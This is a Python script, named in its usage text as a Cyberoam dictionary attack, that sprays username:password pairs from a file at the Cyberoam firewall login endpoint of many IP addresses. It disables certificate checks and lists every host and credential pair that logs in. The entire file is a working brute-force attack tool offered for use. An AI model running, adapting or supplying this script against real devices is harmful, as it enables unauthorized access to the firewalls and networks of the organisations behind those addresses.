import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests
import json


sys.stdout.flush()

def check_credentials(ip, username, password):
    http_url = f"http://{ip}/corporate/Controller"
    https_url = f"https://{ip}/corporate/Controller"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": f"http://{ip}/corporate/webpages/login.jsp"
    }
    payload = {
        "mode": "151",
        "json": f'{{"username":"{username}","password":"{password}","languageid":"1","browser":"Chrome_120"}}'
    }
    
    try:
        response = requests.post(https_url, headers=headers, data=payload, verify=False, timeout=2)
        response.raise_for_status()
    except (requests.exceptions.RequestException, requests.exceptions.HTTPError):
    #    print(f": offline", end='')
        return False
    
    try:
        json_response = response.json()
    except json.decoder.JSONDecodeError:
        return False

    if json_response.get("status") == 200 and json_response.get("redirectionURL") == "/webpages/index.jsp":
        return True
    else:
        return False

def find_accepted_ips(filename, credentials_filename):
    accepted_ips = []
    with open(filename, "r") as ip_file:
        ips = ip_file.read().splitlines()
    with open(credentials_filename, "r") as credentials_file:
        for line in credentials_file:
            username, password = line.strip().split(":")
            print(f"\n======================== For Credentials =  {username}:{password} ========================", end='')
            for ip in ips:
                print(f"\n{ip}", end='')
                if check_credentials(ip, username, password):
                    accepted_ips.append((ip, username, password))
                    print(f"\n {ip}			{username}:{password}", end='')
    return accepted_ips

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python cyberoam_dictionary_attack.py <path/to/url/file> <path/to/credentials/file>")
        sys.exit(1)

    ip_filename = sys.argv[1]
    credentials_filename = sys.argv[2]
    accepted_ips = find_accepted_ips(ip_filename, credentials_filename)

    if accepted_ips:
        for accepted_ip, username, password in accepted_ips:
            full_url = f"https://{accepted_ip}/corporate/webpages/login.jsp"
            print(f"{accepted_ip} credentials {username}:{password} => {full_url}")
    else:
        print("\nNo IP address accepts the provided credentials.")